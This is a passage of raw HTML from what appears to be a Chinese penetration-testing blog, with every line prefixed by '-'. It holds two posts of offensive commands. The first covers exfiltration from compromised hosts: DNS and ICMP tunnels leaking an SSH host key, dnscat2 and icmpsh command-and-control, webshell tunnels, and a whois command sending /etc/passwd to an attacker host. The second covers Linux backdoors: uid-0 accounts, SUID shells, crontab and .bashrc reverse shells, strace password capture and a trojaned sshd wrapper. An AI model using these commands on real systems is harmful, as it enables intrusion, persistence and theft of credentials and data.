class="line">smbpasswd -a share</span><br><span class="line">service smbd restart</span><br><span class="line">访问\\ip</span><br></pre></td></tr></table></figure></p>
-<p>利用scp回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp localfilename root@xx.xx.xx.xx:filename</span><br></pre></td></tr></table></figure></p>
-<h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p>1.命令行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(xxd -p -c 10 ssh_host_ecdsa_key);do sleep 1s &amp;&amp; nslookup $i.xxx.com xx.xx.xx.xx;done</span><br></pre></td></tr></table></figure></p>
-<p>2.dnscat2、dns2tcp</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">攻击机（server）：</span><br><span class="line">安装</span><br><span class="line">apt-get install ruby ruby-dev git make g++ rubygems</span><br><span class="line">gem update --system</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server</span><br><span class="line">bundle install</span><br><span class="line">设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址，运行</span><br><span class="line">ruby ./dnscat2.rb dns.uuzdaisuki.com --no-cache</span><br><span class="line"></span><br><span class="line">受害者（linux）安装</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/client/</span><br><span class="line">make</span><br><span class="line">受害者（windows）安装</span><br><span class="line">https://downloads.skullsecurity.org/dnscat2/ 下载win32.zip的dnascat2后解压</span><br><span class="line"></span><br><span class="line">将server中产生的secret复制下来，运行</span><br><span class="line">./dnscat --dns domain=dns.uuzdaisuki.com --secret=xxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">session -i 1</span><br></pre></td></tr></table></figure>
-<p>详情参考：</p>
-<p><a href="http://next.uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/</a></p>
-<h2 id="ping隧道"><a href="#ping隧道" class="headerlink" title="ping隧道"></a>ping隧道</h2><p>1.命令行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat a.txt | xxd -p -c 1|xargs -n 1 -I &apos;&#123;&#125;&apos; ping -c 1 -s 56 -p &apos;&#123;&#125;&apos; xx.xx.xx.xx</span><br></pre></td></tr></table></figure></p>
-<p>2.pingtunnel</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://www.cs.uit.no/~daniels/PingTunnel/</span><br><span class="line">ptunnel -p 192.168.100.232 -lp 8888 -da 192.168.118.131 -dp 3389</span><br><span class="line">    -p 指定ICMP隧道另一端的IP</span><br><span class="line">    -lp：指定本地监听的端口</span><br><span class="line">    -da：指定要转发的目标机器的IP</span><br><span class="line">    -dp：指定要转发的目标机器的端口</span><br><span class="line">    -x：指定连接密码</span><br></pre></td></tr></table></figure>
-<p>3.icmpsh展开cc通道：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">攻击者机器部署icmpsh：</span><br><span class="line">git clone https://github.com/inquisb/icmpsh.git</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br><span class="line">cd icmpsh</span><br><span class="line">syntax: ./icmpsh_m.py &lt;attacker’s-IP&gt; &lt;target-IP&gt;</span><br><span class="line">./icmpsh_m.py 192.168.1.108 192.168.1.106</span><br><span class="line">受害者机器：</span><br><span class="line">syntax: icmpsh.exe -t &lt;Kali IP&gt;</span><br><span class="line">icmpsh.exe -t 192.168.1.108</span><br></pre></td></tr></table></figure></p>
-<p>4.icmptunnel<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">受害者主机：</span><br><span class="line">安装icmptunnel</span><br><span class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</span><br><span class="line">cd icmptunnel</span><br><span class="line">make</span><br><span class="line">禁用ICMP echo回复</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line">服务端模式启动icmptunnel，并且给新的隧道接口分配一个IP地址</span><br><span class="line">./icmptunnel -s</span><br><span class="line">Ctrlz</span><br><span class="line">bg</span><br><span class="line">/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0</span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line">攻击者主机：</span><br><span class="line">安装icmptunnel</span><br><span class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</span><br><span class="line">cd icmptunnel</span><br><span class="line">make</span><br><span class="line">禁用ICMP echo回复</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line">运行</span><br><span class="line">./icmptunnel 192.168.1.108</span><br><span class="line">ctrl z</span><br><span class="line">/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0</span><br></pre></td></tr></table></figure></p>
-<h2 id="http隧道"><a href="#http隧道" class="headerlink" title="http隧道"></a>http隧道</h2><p>1.reGeorg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/sensepost/reGeorg.git</span><br><span class="line">pip install urllib3</span><br><span class="line">将对应页面上传到目标服务器上</span><br><span class="line">并在本地监听</span><br><span class="line">python reGeorgSocksProxy.py ‐p 8080 ‐l 192.168.1.5 ‐u </span><br><span class="line">访问目标</span><br><span class="line">http://192.168.1.119/tunnel.aspx</span><br></pre></td></tr></table></figure></p>
-<p>2.ABPTTS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">apt-get install python-dev  build-essential libssl-dev libffi-dev  libxml2-dev libxslt1-dev zlib1g-dev python-pip</span><br><span class="line"> pip install pycrypto</span><br><span class="line">git clone https://github.com/nccgroup/ABPTTS.git</span><br><span class="line">cd ABPTTS/</span><br><span class="line">生成payload</span><br><span class="line">python abpttsfactory.py ‐o webshell</span><br><span class="line">传到目标靶机</span><br><span class="line">端口转发</span><br><span class="line">python abpttsclient.py ‐c webshell/config.txt ‐u &quot;http://192.168.1.119/abptts.aspx&quot; ‐f 192.168.1.5:33389/192.168.1.119:3389</span><br><span class="line">让攻击机的33389端口流量转发到3389，通过HTTPS服务</span><br></pre></td></tr></table></figure></p>
-<h2 id="whois隧道"><a href="#whois隧道" class="headerlink" title="whois隧道"></a>whois隧道</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">失陷机：</span><br><span class="line">root@kali:~# whois -h x.x.x.x -p 4444 `cat /etc/passwd | base64`</span><br><span class="line">接受机：</span><br><span class="line">root@kali:/tmp# nc -l -v -p 4444 | sed &quot;&quot;s/ //g&quot;&quot; | base64 -d</span><br></pre></td></tr></table></figure>
-<h2 id="社交平台或工具"><a href="#社交平台或工具" class="headerlink" title="社交平台或工具"></a>社交平台或工具</h2><p>利用腾讯qq、微信等工具回传</p>
-<h2 id="代码托管"><a href="#代码托管" class="headerlink" title="代码托管"></a>代码托管</h2><p>利用github回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">通过一个匿名邮箱注册github账户，并创建一个空仓库</span><br><span class="line">mdkir upload</span><br><span class="line">cd upload</span><br><span class="line">git config --global user.name “user.name”</span><br><span class="line">git config --global user.email “user.email”</span><br><span class="line">git clone https://github.com/xxx/xxx.git</span><br><span class="line">cp -r file upload</span><br><span class="line">git add *</span><br><span class="line">git commit -m &quot;update&quot;</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure></p>
-<h2 id="云储存"><a href="#云储存" class="headerlink" title="云储存"></a>云储存</h2><p>利用百度网盘等网盘类工具回传</p>
-<h2 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h2><p>利用邮件外发回传</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/28/linux后门手法总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/09/28/linux后门手法总结/" itemprop="url">
-                  linux后门手法总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-28T20:00:28+08:00">
-                2020-09-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/09/28/linux后门手法总结/" class="leancloud_visitors" data-flag-title="linux后门手法总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd guest;echo &apos;guest:123456&apos;|chpasswd</span><br><span class="line">echo &quot;guest:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
-<h2 id="ssh公钥登录"><a href="#ssh公钥登录" class="headerlink" title="ssh公钥登录"></a>ssh公钥登录</h2><p>将公钥放到服务器的.ssh/authorized_keys中，使用私钥登录</p>
-<h2 id="suid-shell"><a href="#suid-shell" class="headerlink" title="suid shell"></a>suid shell</h2><p>使用root账户执行如下命令，在某个用户目录下建立一个隐藏的suid文件.233，加点为了隐藏文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /home/test/.233</span><br><span class="line">chmod 4755 /home/test/.233</span><br></pre></td></tr></table></figure></p>
-<p>之后在每次使用时，以其他普通用户的身份使用-p选项运行此文件，即可获得一个root权限的shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/test/.233 -p</span><br></pre></td></tr></table></figure></p>
-<h2 id="ssh软连接"><a href="#ssh软连接" class="headerlink" title="ssh软连接"></a>ssh软连接</h2><p>创建ssh软连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;</span><br></pre></td></tr></table></figure></p>
-<p>攻击机连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@ip:5555</span><br></pre></td></tr></table></figure></p>
-<h2 id="inetd"><a href="#inetd" class="headerlink" title="inetd"></a>inetd</h2><p>可以通过修改/etc/inetd.conf文件维持权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/inetd.conf</span><br><span class="line">添加内容</span><br><span class="line">daytime stream tcp nowait root /bin/bash bash -i</span><br><span class="line">重启服务</span><br><span class="line">service inetd restart</span><br></pre></td></tr></table></figure></p>
-<p>攻击者使用nc连接shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv ip 13</span><br></pre></td></tr></table></figure>
-<h2 id="Crontab后门"><a href="#Crontab后门" class="headerlink" title="Crontab后门"></a>Crontab后门</h2><p>每天6点反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 6 * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
-<h2 id="修改-bash-profile-和-bashrc"><a href="#修改-bash-profile-和-bashrc" class="headerlink" title="修改~/.bash_profile 和~/.bashrc"></a>修改~/.bash_profile 和~/.bashrc</h2><p>此类文件在新shell打开时会自动执行，将后门程序写入这类文件可以在每次打开新shell的时候进行一个反弹shell操作</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在文件中添加bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>利用strace窃取ssh密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.bashrc或者/etc/bashrc</span><br><span class="line">alias ssh=&apos;strace -f -e trace=read,write -o /tmp/.ssh-`date&apos;+%d%h%m%s&apos;`.log -s 32 ssh&apos;</span><br><span class="line">source ~/.bashrc</span><br><span class="line">cat /tmp/.sshxxxxx | grep &quot;read(4,&quot;</span><br></pre></td></tr></table></figure></p>
-<h2 id="SSH-wrapper后门"><a href="#SSH-wrapper后门" class="headerlink" title="SSH wrapper后门"></a>SSH wrapper后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin/</span><br><span class="line">echo &apos;#!/usr/bin/perl&apos; &gt;sshd</span><br><span class="line">echo &apos;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd</span><br><span class="line">echo &apos;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">/etc/init.d/sshd restart</span><br><span class="line">连接：</span><br><span class="line">socat STDIO TCP4:target_ip:22,sourceport=13377</span><br></pre></td></tr></table></figure>
 
           
         
